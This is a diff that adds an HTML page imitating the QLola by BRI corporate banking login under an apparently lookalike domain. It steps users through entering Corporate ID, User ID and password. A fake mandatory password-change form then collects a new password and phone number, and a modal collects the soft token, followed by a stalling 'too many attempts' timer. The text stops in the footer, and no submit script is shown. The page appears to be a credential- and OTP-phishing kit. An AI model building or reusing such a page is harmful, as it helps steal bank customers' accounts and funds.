@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="en" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- TITLE & META DESCRIPTION (Sesuai Gambar Contoh) -->
+    <title>QLola by BRI</title>
+    <meta name="description" content="Manage and track Trade Finance and Bank Guarantee transactions digitally in one integrated platform. Try Now. Smart Payroll Management. PAYROLL. Smart Payroll ...">
+    
+    <!-- OPEN GRAPH (Untuk Preview Sosial Media) -->
+    <meta property="og:title" content="QLola by BRI">
+    <meta property="og:description" content="Manage and track Trade Finance and Bank Guarantee transactions digitally in one integrated platform. Try Now. Smart Payroll Management. PAYROLL. Smart Payroll ...">
+    <meta property="og:image" content="https://i.imgur.com/wcXYJFM.jpeg">
+    <meta property="og:url" content="https://qlolabybri.com">
+    <meta property="og:type" content="website">
+
+    <!-- FONTS & ICONS -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+            color: #333;
+            overflow-x: hidden;
+        }
+
+        /* SPLASH SCREEN */
+        #splashScreen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background-image: url('https://i.imgur.com/7vQAaep.jpeg'); 
+            background-size: cover; background-position: center top; 
+            z-index: 9999; display: flex; align-items: flex-end; justify-content: center; 
+            padding: 0 20px 25vh 20px; transition: opacity 0.8s ease-in-out, visibility 0.8s;
+        }
+        #splashScreen::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(to top, rgba(0, 15, 30, 0.95) 0%, rgba(0, 15, 30, 0.8) 30%, transparent 75%);
+            z-index: -1;
+        }
+        .splash-content {
+            color: #ffffff; max-width: 600px; text-align: center; 
+            display: flex; flex-direction: column; align-items: center; padding-bottom: 0; 
+        }
+        .splash-logo { font-size: 48px; font-weight: 800; margin-bottom: 15px; letter-spacing: -1px; }
+        .splash-title { font-size: 28px; font-weight: 600; margin-bottom: 15px; line-height: 1.3; }
+        .splash-desc { font-size: 15px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
+        .splash-timer-text { font-size: 14px; margin-bottom: 20px; }
+        .splash-timer-text span { font-weight: 700; color: #ffd700; }
+        .goto-btn {
+            display: inline-block; background-color: rgba(255, 255, 255, 0.15); color: #ffffff;
+            text-decoration: none; font-size: 15px; font-weight: 600; cursor: pointer;
+            padding: 12px 30px; border-radius: 8px; border: 1px solid #ffffff; transition: all 0.3s;
+        }
+        .goto-btn:hover { background-color: #ffffff; color: #003378; }
+        #splashScreen.hidden { opacity: 0; visibility: hidden; }
+
+        /* HALAMAN LOGIN */
+        .login-section {
+            position: relative; min-height: 100vh; display: flex; flex-direction: column; background-color: #003378;
+        }
+        .background-layer {
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url('https://i.imgur.com/uttJsvY.jpeg'); 
+            background-size: cover; background-position: center; z-index: 1;
+        }
+        .background-layer::after {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 51, 120, 0.6); 
+        }
+
+        .login-header {
+            position: relative; z-index: 100; padding: 20px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .menu-btn { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; padding: 5px; }
+        
+        .dropdown-menu {
+            display: none; position: absolute; top: 60px; left: 40px; width: auto; min-width: 450px; 
+            background-color: #ffffff; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            z-index: 200; padding: 10px 20px; border: 1px solid #eee; flex-direction: row; gap: 20px;
+        }
+        .dropdown-menu.show { display: flex; }
+        .dropdown-menu a {
+            display: block; padding: 15px 10px; text-decoration: none; color: #333;
+            font-size: 14px; font-weight: 500; transition: color 0.2s; white-space: nowrap; 
+        }
+        .dropdown-menu a:hover { color: #0056B3; }
+
+        .lang-container { position: relative; }
+        .lang-switch {
+            display: flex; align-items: center; gap: 8px; color: #fff; border: 1px solid rgba(255, 255, 255, 0.4);
+            padding: 6px 12px; border-radius: 6px; font-size: 13px;
+            background-color: rgba(255, 255, 255, 0.1); cursor: pointer; user-select: none;
+        }
+        .lang-dropdown {
+            display: none; position: absolute; top: 100%; right: 0; background-color: #fff; border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15); overflow: hidden; margin-top: 5px; min-width: 150px; z-index: 100;
+        }
+        .lang-dropdown.show { display: block; }
+        .lang-dropdown div { padding: 10px 15px; font-size: 13px; color: #333; cursor: pointer; }
+        .lang-dropdown div:hover { background-color: #f1f5f9; }
+
+        .login-card-wrapper {
+            flex: 1; display: flex; justify-content: center;
+            position: relative; z-index: 20; width: 100%; align-items: flex-start; 
+        }
+        
+        .login-card {
+            background-color: #ffffff;
+            width: 100%; 
+            height: 100vh; 
+            
+            margin-top: 0; 
+            
+            border-top-left-radius: 40px; border-top-right-radius: 40px;
+            padding: 40px 20px 40px 20px;
+            
+            transform: translateY(100%);
+            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            
+            display: flex; justify-content: center; position: relative; overflow-y: auto;
+        }
+        
+        @keyframes slideUp {
+            0% { transform: translateY(100%); }
+            100% { transform: translateY(0); }
+        }
+        
+        .form-content { width: 100%; max-width: 340px; transition: opacity 0.3s ease; }
+        
+        .logo-container { display: flex; justify-content: flex-start; margin-bottom: 25px; }
+        .logo-img { height: 60px; width: auto; object-fit: contain; }
+
+        .headline {
+            font-size: 32px; font-weight: 500; color: #111827;
+            line-height: 1.25; margin-bottom: 35px; text-align: left; 
+        }
+
+        .input-group { position: relative; margin-bottom: 25px; width: 100%; }
+        .input-group input {
+            width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #d1d5db;
+            font-size: 15px; color: #333; outline: none; background: transparent;
+        }
+        .input-group input:focus { border-bottom-color: #003378; }
+        .input-group input::placeholder { color: #9ca3af; }
+        .toggle-password {
+            position: absolute; right: 0; top: 50%; transform: translateY(-50%);
+            color: #003378; cursor: pointer; font-size: 18px;
+        }
+        .forgot-password { text-align: right; margin-top: -10px; margin-bottom: 30px; width: 100%; }
+        .forgot-password a { color: #003378; text-decoration: underline; font-size: 14px; font-weight: 500; }
+        
+        .btn { width: 100%; padding: 15px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; text-align: center; border: none;}
+        .btn-login { background-color: #f3f4f6; color: #9ca3af; cursor: not-allowed; margin-bottom: 15px; transition: background 0.3s, color 0.3s; }
+        .btn-login.active { background-color: #003378; color: #ffffff; cursor: pointer; }
+        .btn-signup { background-color: transparent; color: #003378; border: 1px solid #003378; text-decoration: none; display: block; }
+
+        /* FORM GANTI PASSWORD */
+        #formGantiPassword { display: none; opacity: 0; }
+        .alert-box {
+            background-color: #fffbf0; border: 1px solid #f6e0b5; border-radius: 8px;
+            padding: 15px; display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start;
+        }
+        .alert-box i { color: #f5a623; font-size: 20px; margin-top: 2px; }
+        .alert-box p { font-size: 13px; color: #555; line-height: 1.5; margin: 0; }
+
+        .label-text { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 10px; }
+        .input-rounded-group { position: relative; margin-bottom: 10px; width: 100%; }
+        .input-rounded-group input {
+            width: 100%; padding: 15px 40px 15px 45px; border: 1px solid #d1d5db;
+            border-radius: 8px; font-size: 15px; color: #333; outline: none;
+            background-color: #fff; transition: border-color 0.3s;
+        }
+        .input-rounded-group input:focus { border-color: #003378; }
+        .input-rounded-group input::placeholder { color: #9ca3af; }
+        .input-rounded-group .fa-lock { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #7b9ebd; font-size: 18px; }
+        .input-rounded-group .fa-eye, .input-rounded-group .fa-eye-slash {
+            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+            color: #9ca3af; cursor: pointer; font-size: 18px;
+        }
+
+        .error-msg { color: #dc2626; font-size: 11px; margin-bottom: 15px; display: none; line-height: 1.4; }
+        .error-msg.show { display: block; }
+
+        .phone-group { display: flex; gap: 10px; margin-bottom: 25px; }
+        .phone-prefix {
+            width: 80px; padding: 15px; border: 1px solid #d1d5db; border-radius: 8px;
+            font-size: 15px; color: #333; text-align: center; background-color: #fff; outline: none;
+        }
+        .phone-input {
+            flex: 1; padding: 15px; border: 1px solid #d1d5db; border-radius: 8px;
+            font-size: 15px; color: #333; outline: none; background-color: #fff;
+        }
+        .phone-input:focus, .phone-prefix:focus { border-color: #003378; }
+
+        .btn-lanjutkan { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed; margin-top: 10px; transition: background 0.3s, color 0.3s; }
+        .btn-lanjutkan.active { background-color: #003378; color: #ffffff; cursor: pointer; }
+
+        /* MODAL TOKEN */
+        .modal-overlay {
+            display: none; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0, 0, 0, 0.4); z-index: 1000; justify-content: center;
+            align-items: flex-start; padding-top: 10vh; padding-left: 20px; padding-right: 20px; padding-bottom: 20px;
+        }
+        .modal-overlay.show { display: flex; animation: fadeInOverlay 0.3s ease forwards; }
+        @keyframes fadeInOverlay { from { opacity: 0; } to { opacity: 1; } }
+        .modal-box {
+            background-color: #ffffff; width: 100%; max-width: 450px; border-radius: 12px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            overflow: hidden; animation: slideDownModal 0.3s ease-out forwards;
+        }
+        @keyframes slideDownModal { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        .modal-header { padding: 20px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e7eb; }
+        .modal-header h3 { font-size: 20px; font-weight: 700; color: #111827; }
+        .modal-header .close-btn { background: none; border: none; font-size: 20px; color: #6b7280; cursor: pointer; transition: color 0.2s; }
+        .modal-header .close-btn:hover { color: #ef4444; }
+        .modal-body { padding: 25px; }
+        .modal-desc { font-size: 15px; color: #4b5563; line-height: 1.6; margin-bottom: 25px; }
+        .modal-label { font-size: 15px; font-weight: 700; color: #111827; margin-bottom: 10px; display: block; }
+        .modal-label span { color: #dc2626; }
+        .token-input-group { position: relative; margin-bottom: 15px; }
+        .token-input-group input {
+            width: 100%; padding: 16px 45px 16px 16px; border: 1px solid #d1d5db;
+            border-radius: 8px; font-size: 15px; color: #333; outline: none;
+        }
+        .token-input-group input:focus { border-color: #003378; }
+        .token-input-group input::placeholder { color: #9ca3af; }
+        .token-input-group i {
+            position: absolute; right: 16px; top: 50%; transform: translateY(-50%);
+            color: #6b7280; cursor: pointer; font-size: 18px;
+        }
+        .modal-footer { display: flex; justify-content: space-between; align-items: center; padding: 0 25px 25px 25px; }
+        .btn-cancel { background: none; border: none; color: #dc2626; font-size: 15px; font-weight: 600; cursor: pointer; padding: 10px; margin-left: -10px; }
+        .btn-confirm {
+            background-color: #0044cc; color: #ffffff; border: none; padding: 12px 30px;
+            border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;
+            transition: background 0.3s, opacity 0.3s;
+        }
+        .btn-confirm:hover { background-color: #003399; }
+        .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+        /* MODAL TIMER */
+        .modal-alert {
+            background-color: #ffffff; width: 100%; max-width: 400px; border-radius: 12px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); overflow: hidden;
+            animation: slideDownModal 0.3s ease-out forwards; text-align: center; padding: 30px 20px;
+        }
+        .modal-alert i { font-size: 50px; color: #ef4444; margin-bottom: 15px; }
+        .modal-alert h3 { font-size: 18px; font-weight: 700; color: #111827; margin-bottom: 10px; }
+        .modal-alert p { font-size: 14px; color: #4b5563; line-height: 1.6; margin-bottom: 20px; }
+        .timer-countdown { font-size: 36px; font-weight: 800; color: #ef4444; margin-bottom: 25px; }
+        .btn-close-alert {
+            background-color: #003378; color: #ffffff; border: none; padding: 12px 30px;
+            border-radius: 8px; font-size: 15px; font-weight: 600; cursor: not-allowed; 
+            opacity: 0.5; width: 100%; transition: all 0.3s;
+        }
+        .btn-close-alert.active { cursor: pointer; opacity: 1; }
+
+        /* LANDING PAGE */
+        .platform-section { padding: 60px 20px; max-width: 1200px; margin: 0 auto; }
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .section-header h2 { font-size: 24px; font-weight: 500; color: #111827; }
+        .nav-arrows { display: flex; gap: 10px; }
+        .nav-arrows span {
+            width: 36px; height: 36px; border-radius: 50%; border: 1px solid #d1d5db;
+            display: flex; justify-content: center; align-items: center; color: #6b7280; cursor: pointer;
+        }
+        .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+        .card { border-radius: 16px; min-height: 380px; position: relative; overflow: hidden; }
+        .card-instant { background-color: #0056B3; }
+        .card-instant img, .card-fund img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .card-fund { background-color: #003378; }
+
+        .awards-section { background-color: #0056B3; padding: 60px 20px; color: #ffffff; }
+        .awards-container { max-width: 1200px; margin: 0 auto; }
+        .awards-container h2 { font-size: 22px; font-weight: 500; margin-bottom: 40px; }
+        .awards-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
+        .award-item { border-left: 1px solid rgba(255,255,255,0.3); padding-left: 20px; }
+        .award-item h4 { font-size: 16px; font-weight: 600; margin-bottom: 8px; }
+        .award-item p { font-size: 13px; opacity: 0.8; line-height: 1.5; }
+
+        .testimonial-section { padding: 60px 20px; background-color: #ffffff; }
+        .testimonial-container {
+            max-width: 1000px; margin: 0 auto; border-radius: 20px; overflow: hidden; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08); background-color: #0056B3; 
+        }
+        .testimonial-image-wrapper { width: 100%; height: 350px; overflow: hidden; }
+        .testimonial-image { width: 100%; height: 100%; object-fit: cover; object-position: top; display: block; }
+        .testimonial-content { padding: 40px; color: #ffffff; }
+        .quote-icon { font-size: 30px; color: rgba(255,255,255,0.4); margin-bottom: 20px; }
+        .testimonial-content p { font-size: 16px; line-height: 1.8; color: #ffffff; margin-bottom: 25px; font-style: italic; }
+        .testimonial-author { font-size: 14px; font-weight: 700; color: #ffffff; }
+        .testimonial-nav { display: flex; justify-content: flex-end; align-items: center; gap: 15px; margin-top: 30px; font-size: 13px; color: #e0f2fe; }
+        .nav-btn { width: 36px; height: 36px; border-radius: 50%; border: 1px solid #e0f2fe; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+
+        .video-section { width: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; }
+        .video-section iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+
+        .insight-section { padding: 60px 20px; background-color: #f8fafc; }
+        .insight-container { max-width: 1200px; margin: 0 auto; }
+        .insight-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .insight-header h2 { font-size: 24px; font-weight: 500; color: #111827; }
+        .insight-slider { display: flex; gap: 24px; overflow-x: auto; scroll-snap-type: x mandatory; padding-bottom: 20px; scrollbar-width: none; }
+        .insight-slider::-webkit-scrollbar { display: none; }
+        .insight-card { 
+            background: #ffffff; border-radius: 12px; border: 1px solid #e5e7eb; overflow: hidden; 
+            display: flex; flex-direction: row; min-width: calc(50% - 12px); scroll-snap-align: start; height: auto; 
+        }
+        .insight-image { width: 40%; height: 100%; min-height: 150px; background: linear-gradient(135deg, #0056B3 0%, #003378 100%); display: flex; justify-content: center; align-items: center; color: rgba(255,255,255,0.3); font-size: 40px; overflow: hidden; flex-shrink: 0; }
+        .insight-image img { width: 100%; height: 100%; object-fit: cover; }
+        .insight-content { padding: 20px; width: 60%; display: flex; flex-direction: column; justify-content: center; }
+        .insight-content h3 { font-size: 15px; font-weight: 600; color: #111827; margin-bottom: 10px; line-height: 1.4; }
+        .insight-meta { display: flex; align-items: center; gap: 10px; font-size: 11px; color: #9ca3af; }
+        .news-tag { background-color: #0056B3; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; }
+
+        .footer { background-color: #0056B3; color: #ffffff; padding: 60px 20px 20px 20px; }
+        .footer-container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 40px; }
+        .footer-logo-img { height: 50px; width: auto; margin-bottom: 20px; display: block; }
+        .footer-links a { display: block; color: #ffffff; text-decoration: none; font-size: 14px; margin-bottom: 15px; opacity: 0.9; }
+        .footer-col h4 { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
+        .footer-col p { font-size: 13px; line-height: 1.6; margin-bottom: 15px; opacity: 0.9; }
+        .footer-col i { margin-right: 10px; font-size: 14px; }
+        .footer-bottom { max-width: 1200px; margin: 40px auto 0 auto; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.2); text-align: center; font-size: 12px; opacity: 0.8; }
+
+        .chat-btn { position: fixed; bottom: 30px; right: 30px; background-color: #0056B3; color: #ffffff; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.4); cursor: pointer; z-index: 100; border: none; }
+
+        @media (max-width: 768px) {
+            .cards-grid, .awards-grid, .footer-container { grid-template-columns: 1fr; }
+            
+            .login-card { 
+                margin-top: 0; 
+                padding: 30px 20px 40px 20px; 
+            }
+            
+            .headline { font-size: 28px; }
+            .card { min-height: 300px; }
+            .section-header h2, .insight-header h2 { font-size: 20px; }
+            .testimonial-content { padding: 25px; }
+            .testimonial-image-wrapper { height: 250px; }
+            .insight-card { min-width: 90%; }
+            .dropdown-menu { width: calc(100% - 40px); left: 20px; flex-direction: column; gap: 0; padding: 10px; }
+            .dropdown-menu a { border-bottom: 1px solid #eee; }
+            .splash-logo { font-size: 36px; }
+            .splash-title { font-size: 22px; }
+            .splash-desc { font-size: 13px; }
+            #splashScreen { padding-bottom: 20vh; }
+            
+            .modal-overlay { padding-top: 15vh; }
+            .modal-body { padding: 20px; }
+            .modal-footer { padding: 0 20px 20px 20px; }
+        }
+
+        @media (min-width: 769px) {
+            .login-card { margin-top: 80px; height: calc(100vh - 80px); border-radius: 40px 40px 0 0; }
+            .form-content { max-width: 360px; }
+            .headline { font-size: 34px; }
+            .login-header { padding: 30px 60px; }
+            .platform-section, .insight-section { padding: 80px 10%; }
+            .awards-section, .testimonial-section { padding: 80px 10%; }
+            .footer { padding: 80px 10% 20px 10%; }
+            .card { min-height: 400px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SPLASH SCREEN -->
+    <div id="splashScreen">
+        <div class="splash-content">
+            <div class="splash-logo">Qlola</div>
+            <h1 class="splash-title">Pengalaman lebih baik bersama Qlola</h1>
+            <p class="splash-desc">Kini hadir dengan tampilan dan fitur baru untuk pengelolaan bisnis yang lebih optimal.</p>
+            <p class="splash-timer-text">Anda akan dialihkan secara otomatis dalam <span id="timerDisplay">5</span> detik.</p>
+            <a href="#" class="goto-btn" onclick="skipSplash()">Pergi ke halaman</a>
+        </div>
+    </div>
+
+    <!-- HALAMAN LOGIN UTAMA -->
+    <section class="login-section">
+        <div class="background-layer"></div>
+
+        <header class="login-header">
+            <button class="menu-btn" onclick="toggleMenuDropdown()"><i class="fa-solid fa-bars"></i></button>
+            
+            <div class="dropdown-menu" id="menuDropdown">
+                <a href="#">Services</a>
+                <a href="#">Clients</a>
+                <a href="#">Insights</a>
+                <a href="#">FAQ</a>
+            </div>
+
+            <div class="lang-container">
+                <div class="lang-switch" onclick="toggleLangDropdown()">
+                    <span id="currentLang">EN</span>
+                    <i class="fa-solid fa-chevron-down"></i>
+                </div>
+                <div class="lang-dropdown" id="langDropdown">
+                    <div onclick="changeLang('Bahasa Indonesia')">Bahasa Indonesia</div>
+                    <div onclick="changeLang('English')">English</div>
+                </div>
+            </div>
+        </header>
+
+        <div class="login-card-wrapper">
+            <!-- ANIMASI SLIDE UP DITERAPKAN DI SINI -->
+            <div class="login-card">
+                
+                <!-- FORM 1: LOGIN AWAL -->
+                <div class="form-content" id="formLogin">
+                    <div class="logo-container">
+                        <img src="https://i.imgur.com/wcXYJFM.jpeg" alt="Logo Qlola by BRI - platform bisnis digital" class="logo-img">
+                    </div>
+                    <h1 class="headline">Your business<br>growth starts here</h1>
+                    <form id="loginForm" onsubmit="return handleLogin(event)">
+                        <div class="input-group">
+                            <input type="text" id="corporateId" placeholder="Enter your Corporate ID" required oninput="checkFormValidity()">
+                        </div>
+                        <div class="input-group">
+                            <input type="text" id="userId" placeholder="Enter your User ID" required oninput="checkFormValidity()">
+                        </div>
+                        <div class="input-group">
+                            <input type="password" id="password" placeholder="Password" required oninput="checkFormValidity()">
+                            <i class="fa-regular fa-eye toggle-password" onclick="togglePassword('password', 'eyeIcon1')" id="eyeIcon1"></i>
+                        </div>
+                        <div class="forgot-password">
+                            <a href="#">Forgot Password?</a>
+                        </div>
+                        <button type="submit" class="btn btn-login" id="btnLogin" disabled>Log In</button>
+                        <a href="#" class="btn btn-signup">Sign Up</a>
+                    </form>
+                </div>
+
+                <!-- FORM 2: GANTI PASSWORD -->
+                <div class="form-content" id="formGantiPassword">
+                    <div class="logo-container">
+                        <img src="https://i.imgur.com/wcXYJFM.jpeg" alt="Logo Qlola by BRI - platform bisnis digital" class="logo-img">
+                    </div>
+                    <div class="alert-box">
+                        <i class="fa-solid fa-triangle-exclamation"></i>
+                        <p><strong>Peringatan keamanan:</strong> Anda diwajibkan untuk mengganti kata sandi Anda secara berkala. Pastikan kata sandi baru terdiri dari kombinasi huruf besar, huruf kecil, angka, dan karakter khusus minimal 8 karakter.</p>
+                    </div>
+                    <form id="passwordForm" onsubmit="return handlePasswordChange(event)">
+                        <label class="label-text">Kata Sandi Baru</label>
+                        <div class="input-rounded-group">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="newPassword" placeholder="Masukkan kata sandi baru" required oninput="checkPasswordValidity()">
+                            <i class="fa-regular fa-eye" onclick="togglePassword('newPassword', 'eyeIcon2')" id="eyeIcon2"></i>
+                        </div>
+                        <div class="error-msg" id="errNewPass">Kata sandi harus minimal 8 karakter, mengandung huruf besar, huruf kecil, angka, dan simbol (contoh: Qlola2026!).</div>
+
+                        <label class="label-text">Ulangi Sandi Baru</label>
+                        <div class="input-rounded-group">
+                            <i class="fa-solid fa-lock"></i>
+                            <input type="password" id="confirmPassword" placeholder="Ulangi kata sandi baru" required oninput="checkPasswordValidity()">
+                            <i class="fa-regular fa-eye" onclick="togglePassword('confirmPassword', 'eyeIcon3')" id="eyeIcon3"></i>
+                        </div>
+                        <div class="error-msg" id="errConfirmPass">Konfirmasi kata sandi tidak cocok.</div>
+
+                        <label class="label-text">Nomor Telepon Genggam</label>
+                        <div class="phone-group">
+                            <input type="text" class="phone-prefix" value="+62" readonly>
+                            <input type="text" class="phone-input" id="phoneNumber" placeholder="8xx-xxxx-xxxx" required oninput="checkPasswordValidity()">
+                        </div>
+                        <button type="submit" class="btn btn-lanjutkan" id="btnLanjutkan" disabled>Lanjutkan</button>
+                    </form>
+                </div>
+
+                <!-- POP-UP MODAL: TOKEN LUNAK -->
+                <div class="modal-overlay" id="modalToken">
+                    <div class="modal-box">
+                        <div class="modal-header">
+                            <h3>Perubahan Kata Sandi</h3>
+                            <button type="button" class="close-btn" onclick="closeModalToken()">
+                                <i class="fa-solid fa-xmark"></i>
+                            </button>
+                        </div>
+                        <div class="modal-body">
+                            <p class="modal-desc">Masukkan Soft Token Anda untuk mengonfirmasi perubahan kata sandi.</p>
+                            <label class="modal-label">Token Lunak <span>*</span></label>
+                            <div class="token-input-group">
+                                <input type="password" id="softToken" placeholder="Masukkan Token Lunak" oninput="checkTokenValidity()">
+                                <i class="fa-regular fa-eye" id="eyeTokenIcon" onclick="toggleTokenPassword()"></i>
+                            </div>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn-cancel" onclick="closeModalToken()">Batalkan</button>
+                            <button type="button" class="btn-confirm" id="btnKonfirmasi" disabled onclick="submitSoftToken()">Konfirmasi</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- POP-UP MODAL: TERLALU BANYAK PERCOBAAN (TIMER) -->
+                <div class="modal-overlay" id="modalAlertTimer">
+                    <div class="modal-alert">
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                        <h3>Akses Dibatasi</h3>
+                        <p>Terlalu banyak percobaan. Mohon tunggu dalam waktu:</p>
+                        <div class="timer-countdown" id="countdownText">30</div>
+                        <button type="button" class="btn-close-alert" id="btnCloseAlert" onclick="closeAlertModal()">Mohon Tunggu...</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- LANDING PAGE SECTION -->
+    <section class="platform-section">
+        <div class="section-header">
+            <h2>One platform for every business, every goal.</h2>
+            <div class="nav-arrows">
+                <span><i class="fa-solid fa-chevron-left"></i></span>
+                <span><i class="fa-solid fa-chevron-right"></i></span>
+            </div>
+        </div>
+        <div class="cards-grid">
+            <div class="card card-instant">
+                <img src="https://i.imgur.com/Ycb4ddy.jpeg" alt="Fitur Instant Payment Qlola untuk transfer bisnis real-time">
+            </div>
+            <div class="card card-fund">
+                <img src="https://i.imgur.com/dos9wrD.jpeg" alt="Fitur Efficient Fund Management Qlola untuk pengelolaan likuiditas">
+            </div>
+        </div>
+    </section>
+
+    <section class="awards-section">
+        <div class="awards-container">
+            <h2>Reliable partner your business deserves Testing</h2>
+            <div class="awards-grid">
+                <div class="award-item">
+                    <h4>Alpha Southeast Asia</h4>
+                    <p>Best Cash Management Bank 2026</p>
+                </div>
+                <div class="award-item">
+                    <h4>Alpha Southeast Asia</h4>
+                    <p>Special Marquee – Best Transactional Banking Online Platform 2026</p>
+                </div>
+                <div class="award-item">
+                    <h4>Asian Banking & Finance Wholesale Banking Awards</h4>
+                    <p>Domestic Liquidity Management Bank of the Year – 2026</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="testimonial-section">
+        <div class="testimonial-container">
+            <div class="testimonial-image-wrapper">
+                <img src="https://i.imgur.com/5Kithv2.jpeg" class="testimonial-image" alt="Perusahaan akuakultur dan produksi pangan, klien Qlola BRI">
+            </div>
+            <div class="testimonial-content">
+                <i class="fa-solid fa-quote-left quote-icon"></i>
+                <p>Trade finance transactions have become more efficient. The save as template feature allows us to store previous LC history, the modern interface is easy to understand, and issuing LC can be done digitally without complications. Access to MT700 and MT701 is a distinctive advantage we have not found in other banks.</p>
+                <div class="testimonial-author">Aquaculture and Food Production Company</div>
+                <div class="testimonial-nav">
+                    <span>1 of 4</span>
+                    <span class="nav-btn"><i class="fa-solid fa-chevron-left"></i></span>
+                    <span class="nav-btn"><i class="fa-solid fa-chevron-right"></i></span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="video-section">
+        <iframe src="https://www.youtube.com/embed/KpM88LFRicU?si=emWZPHS82QRzNTBU" title="Video profil Qlola by BRI - platform bisnis digital" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+    </section>
+
+    <!-- LATEST INSIGHT SECTION -->
+    <section class="insight-section">
+        <div class="insight-container">
+            <div class="insight-header">
+                <h2>Latest Insight</h2>
+                <div class="nav-arrows">
+                    <span><i class="fa-solid fa-chevron-left"></i></span>
+                    <span><i class="fa-solid fa-chevron-right"></i></span>
+                </div>
+            </div>
+            
+            <div class="insight-slider">
+                <div class="insight-card">
+                    <div class="insight-image">
+                        <img src="https://i.imgur.com/Kz3hcny.jpeg" alt="Berita: BRI Brand Value capai USD 6,9 miliar tertinggi di Indonesia 2026">
+                    </div>
+                    <div class="insight-content">
+                        <h3>BRI Brand Value Hits USD 6.9 Billion, Highest in Indonesia in 2026</h3>
+                        <div class="insight-meta">
+                            <span class="news-tag">News</span>
+                            <span class="insight-date">Sunday, 11 October 2026 | 07:59</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="insight-card">
+                    <div class="insight-image">
+                        <img src="https://i.imgur.com/7YhV2aT.jpeg" alt="Berita: BRI perkuat bisnis berorientasi nasabah">
+                    </div>
+                    <div class="insight-content">
+                        <h3>BRI Continues to Strengthen Customer-Centric Business</h3>
+                        <div class="insight-meta">
+                            <span class="news-tag">News</span>
+                            <span class="insight-date">Sunday, 11 October 2026 | 07:59</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="insight-card">
+                    <div class="insight-image">
+                        <img src="https://i.imgur.com/4FWrkmC.jpeg" alt="Berita: BRI dukung digitalisasi pembayaran sektor manufaktur">
+                    </div>
+                    <div class="insight-content">
+                        <h3>BRI Dukung Sektor Manufaktur Nasional Lewat Digitalisasi Pembayaran</h3>
+                        <div class="insight-meta">
+                            <span class="news-tag">News</span>
+                            <span class="insight-date">Sunday, 11 October 2026 | 07:59</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div>
+                <img src="https://i.imgur.com/CBTQdca.jpeg" alt="Logo Qlola by BRI" class="footer-logo-img">
+                <div class="footer-links">
+                    <a href="#">About Qlola</a>
+                    <a href="#">FAQ</a>
+                    <a href="#">Privacy Policy</a>
+                </div>
+            </div>
+            <div>
+                <div class="footer-col" style="margin-bottom: 30px;">
+                    <h4>Head Office</h4>
